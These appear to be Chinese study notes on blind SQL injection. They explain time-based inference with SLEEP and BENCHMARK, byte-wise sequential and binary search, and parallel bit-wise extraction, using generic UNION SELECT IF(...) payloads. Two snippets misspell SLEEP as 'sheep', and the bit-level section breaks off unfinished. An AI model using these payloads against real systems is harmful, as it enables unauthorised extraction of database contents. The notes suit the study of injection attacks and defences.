>盲注，按照盲注的方法有三种盲注方式
1. 基于时间的盲注；
2. 基于内容/错误的盲注；
按照盲注的条件，即又可以分为：
1. 以单词为条件；
2. 以字节为单位；
3. 以bit为单位的并发；

1. 以单词为条件；

```sql
union select if(system_user='sa' ,sheep(1),1)
```


这个就是以system_user整个为单位，判断是否符合要求
2. 以字节为单位
使用substring函数提取字符串中的一位

```sql
union select if(ascii(substring((...),i,1)) >k ,sheep(1),1)
```


3. 使用bit为单位
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/96yh7wi75wi.png" width="400px" />

## 基于时间的盲注

### MySQL
1. 使用sleep函数
2. 使用BENCHMARK函数

### 按照单词进行盲注
可进行的最简单的推断是我们是否在作为超级用户运行查询:
1. 使用sleep函数
```sql
SELECT count(*) FROM reviews WHERE review_auther='MadBob' UNION
SELECT IF(SUBSTRING(USER(),1,4)='root',SLEEP(5),1)；
```
2.使用BENCHMARK函数
```sql
SELECT count(*) FROM reviews WHERE review_auther='MadBob' UNION
SELECT IF(SUBSTRING(USER(),1,4)='root',BENCHMARK(100000,RAND()),1);
```
### 以字节为单位进行盲注
以字节为单位的话，存在两种比较方式。第一种是顺序盲注。第二种是二分盲注
举个例子
```sql
UNION SELECT IF(ASCII(SUBSTRING((...),i, 1))>k, SLEEP(1),1)
```
顺序盲注即k是按照顺序从'A'到'Z'的。
二分盲注的话，如下。即对分查找
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/vlybnq8at69.png" width="600px" />


### 以bit为单位的并发盲注

分搜索技术将8个bit划分为一个字节,通过8个请求来推断这8个位的值。我们是否可以尝试用每个请求来推断单个指定位(比如字节的第二位)的值呢?如果可行的话,我们可以为字节的8个位发出8个并行请求,这样一来,检索字节值花费的时间比二进制搜索方法的检索时间还少,因为请求是并行产生的而非一个接一个地产生。同时这个也牵扯到了















```{.python .input}

```
